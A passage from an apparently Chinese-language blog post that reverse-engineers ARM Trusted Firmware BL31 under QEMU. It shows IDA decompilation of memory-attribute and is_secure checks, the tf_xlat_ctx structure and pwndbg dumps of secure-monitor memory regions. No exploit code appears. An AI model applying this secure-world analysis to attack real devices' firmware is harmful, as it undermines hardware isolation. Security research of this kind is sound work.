<p>通过<code>0xE0A3234</code>处的引用，我们往里追溯可以找到字符串<code>mmap_add_region_check() failed. error %d</code>，在源码中搜索可以将<code>sub_E0A33E0</code>对应到<code>mmap_add_region_ctx</code>，从而判断出<code>0xE0AD000</code>处的结构体类型为<code>xlat_ctx_t</code>，并根据源码判断该结构体为全局变量<code>tf_xlat_ctx</code>。</p>
<p>根据源码中对<code>tf_xlat_ctx</code>的引用，又可以将<code>sub_6618</code>对应到<code>xlat_get_mem_attributes</code>函数，通过源码中<code>xlat_get_mem_attributes_internal</code>可以推断出<code>sub_E0A663C</code>中一系列操作是在取页表属性值：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">xlat_get_mem_attributes_ctx</span><span class="p">(</span><span class="kt">xlat_ctx_t</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// x8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// x9
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint64_t</span> <span class="o">**</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// x11
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint64_t</span> <span class="n">desc</span><span class="p">;</span> <span class="c1">// x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">attr_index</span><span class="p">;</span> <span class="c1">// w0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">out_level</span><span class="p">;</span> <span class="c1">// [xsp+2Ch] [xbp+2Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">entry</span> <span class="o">=</span> <span class="nf">find_xlat_table_entry</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">max_pa</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">max_va</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">va_max_address</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">out_level</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">entry</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mh">0xFFFFFFEALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">desc</span> <span class="o">=</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v8</span> <span class="o">=</span> <span class="n">desc</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v7</span> <span class="o">=</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v6</span> <span class="o">=</span> <span class="n">out_level</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">attr_index</span> <span class="o">=</span> <span class="p">((</span><span class="n">desc</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">;</span>        <span class="c1">// attr_index = (desc &gt;&gt; ATTR_INDEX_SHIFT) &amp; ATTR_INDEX_MASK
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="n">attr_index</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="n">attr_index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">res</span> <span class="o">|=</span> <span class="mi">8u</span><span class="p">;</span>                                 <span class="c1">// MT_RW
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">res</span> <span class="o">|=</span> <span class="mh">0x80u</span><span class="p">;</span>                              <span class="c1">// MT_USER
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">res</span> <span class="o">|=</span> <span class="mh">0x10u</span><span class="p">;</span>                              <span class="c1">// MT_NS
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nf">xlat_arch_regime_get_xn_desc</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">))</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">desc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">res</span> <span class="o">|=</span> <span class="mh">0x40u</span><span class="p">;</span>                              <span class="c1">// MT_EXECUTE_NEVER
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>从而得到<code>sub_E0A2FF8</code>是在判断地址属性中<code>MT_NS(1)/MT_SECURE(0)</code>标志来判断地址是否安全：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">is_secure</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">attr</span><span class="p">;</span> <span class="c1">// [xsp+1Ch] [xbp+1Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">attr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">xlat_get_mem_attributes</span><span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">((</span><span class="n">attr</span> <span class="o">^</span> <span class="mh">0x10uLL</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>           <span class="c1">// #define MT_SECURE       (U(0) &lt;&lt; MT_PAS_SHIFT)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="c1">// #define MT_NS           (U(1) &lt;&lt; MT_PAS_SHIFT)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="c1">//     if (ns_bit == 1ULL) {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="c1">//         *attributes |= MT_NS;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="c1">//     } else {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="c1">//         *attributes |= MT_SECURE;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="c1">//     }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="c1">// MT_NS返回0，MT_SECURE返回1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h3 id="获取内存映射信息">获取内存映射信息<a hidden class="anchor" aria-hidden="true" href="#获取内存映射信息">#</a></h3>
<p>参考：<a href="https://hackmd.io/@BooleanII/linux2024-ARM_Trusted_Firmware#Connect-GDB-to-QEMU">Connect-GDB-to-QEMU</a></p>
<p>参考源码<code>include\lib\xlat_tables\xlat_tables_v2_helpers.h</code>，结合IDA逆向得到的<code>tf_xlat_ctx</code>得知，<code>tf_xlat_ctx-&gt;mmap</code>地址为<code>0xE0D7398</code>，长度为<code>0xb</code>：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD000</span>                         <span class="p">;</span> <span class="kt">xlat_ctx_t</span> <span class="n">tf_xlat_ctx</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD000</span> <span class="n">FF</span> <span class="n">FF</span> <span class="n">FF</span> <span class="n">FF</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">tf_xlat_ctx</span>     <span class="n">DCQ</span> <span class="mh">0xFFFFFFFF</span>          <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="nl">bl31_entrypoint</span><span class="p">:</span><span class="n">loc_E0A0070</span><span class="err">↑</span><span class="n">o</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD000</span>                                                                 <span class="p">;</span> <span class="n">bl31_entrypoint</span><span class="o">+</span><span class="n">C0</span><span class="err">↑</span><span class="n">o</span> <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD000</span>                                                                 <span class="p">;</span> <span class="n">pa_max_address</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD008</span> <span class="n">FF</span> <span class="n">FF</span> <span class="n">FF</span> <span class="n">FF</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">qword_E0AD008</span>   <span class="n">DCQ</span> <span class="mh">0xFFFFFFFF</span>          <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">enable_mmu</span><span class="o">+</span><span class="mi">24</span><span class="err">↑</span><span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD008</span>                                                                 <span class="p">;</span> <span class="n">va_max_address</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD010</span> <span class="mi">98</span> <span class="mi">73</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="n">E</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                 <span class="n">DCQ</span> <span class="mh">0xE0D7398</span>           <span class="p">;</span> <span class="n">mmap</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD018</span> <span class="mi">0</span><span class="n">B</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                 <span class="n">DCQ</span> <span class="mh">0xB</span>                 <span class="p">;</span> <span class="n">mmap_num</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD020</span> <span class="mo">00</span> <span class="mi">80</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="n">E</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                 <span class="n">DCQ</span> <span class="mh">0xE0D8000</span>           <span class="p">;</span> <span class="n">tables</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD028</span> <span class="mo">06</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                             <span class="n">DCD</span> <span class="mi">6</span>                   <span class="p">;</span> <span class="n">tables_num</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD02C</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                             <span class="n">DCD</span> <span class="mi">0</span>                   <span class="p">;</span> <span class="n">readonly_tables</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD030</span> <span class="mi">88</span> <span class="mi">77</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="n">E</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                 <span class="n">DCQ</span> <span class="mh">0xE0D7788</span>           <span class="p">;</span> <span class="n">tables_mapped_regions</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD038</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                 <span class="n">DCQ</span> <span class="mi">0</span>                   <span class="p">;</span> <span class="n">next_table</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD040</span> <span class="mi">80</span> <span class="mi">78</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="n">E</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">qword_E0AD040</span>   <span class="n">DCQ</span> <span class="mh">0xE0D7880</span>           <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">enable_mmu</span><span class="o">+</span><span class="mi">28</span><span class="err">↑</span><span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD040</span>                                                                 <span class="p">;</span> <span class="n">base_table</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD048</span> <span class="mo">04</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                 <span class="n">DCQ</span> <span class="mi">4</span>                   <span class="p">;</span> <span class="n">base_table_entries</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD050</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                             <span class="n">DCD</span> <span class="mi">0</span>                   <span class="p">;</span> <span class="n">max_pa</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD054</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                             <span class="n">DCD</span> <span class="mi">0</span>                   <span class="p">;</span> <span class="n">max_va</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD058</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                             <span class="n">DCD</span> <span class="mi">0</span>                   <span class="p">;</span> <span class="n">base_level</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD05C</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                             <span class="n">DCD</span> <span class="mi">0</span>                   <span class="p">;</span> <span class="n">initialized</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD060</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                             <span class="n">DCD</span> <span class="mi">1</span>                   <span class="p">;</span> <span class="n">xlat_regime</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD064</span> <span class="mo">00</span>                                      <span class="n">DCB</span>    <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD065</span> <span class="mo">00</span>                                      <span class="n">DCB</span>    <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD066</span> <span class="mo">00</span>                                      <span class="n">DCB</span>    <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AD067</span> <span class="mo">00</span>                                      <span class="n">DCB</span>    <span class="mi">0</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>虽然有的函数符号不准，但为了用结构体定义还是可以加载一下自己编译的可执行文件的符号：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; add-symbol-file ../../../arm-trusted-firmware-2.10.0/build/qemu/debug/bl31/bl31.elf
</span></span><span class="line"><span class="cl">add symbol table from file <span class="s2">&#34;../../../arm-trusted-firmware-2.10.0/build/qemu/debug/bl31/bl31.elf&#34;</span>
</span></span><span class="line"><span class="cl">Reading symbols from ../../../arm-trusted-firmware-2.10.0/build/qemu/debug/bl31/bl31.elf...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; ptype struct mmap_region
</span></span><span class="line"><span class="cl"><span class="nb">type</span> <span class="o">=</span> struct mmap_region <span class="o">{</span>
</span></span><span class="line"><span class="cl">    unsigned long long base_pa<span class="p">;</span>
</span></span><span class="line"><span class="cl">    uintptr_t base_va<span class="p">;</span>
</span></span><span class="line"><span class="cl">    size_t size<span class="p">;</span>
</span></span><span class="line"><span class="cl">    unsigned int attr<span class="p">;</span> <span class="c1"># 标识属性</span>
</span></span><span class="line"><span class="cl">    size_t granularity<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; p /x *<span class="o">(</span>struct mmap_region *<span class="o">)</span>0xE0D7398@0xb <span class="c1"># tf_xlat_ctx-&gt;mmap</span>
</span></span><span class="line"><span class="cl"><span class="nv">$1</span> <span class="o">=</span> <span class="o">{{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0x8000000,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0x8000000,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0x1000000,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x8,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x40000000
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0x9000000,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0x9000000,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0xc00000,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x8,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x40000000
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0xe000000,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0xe000000,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0x1000,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x8,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x40000000
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0xe0a0000,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0xe0a0000,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0xb000,
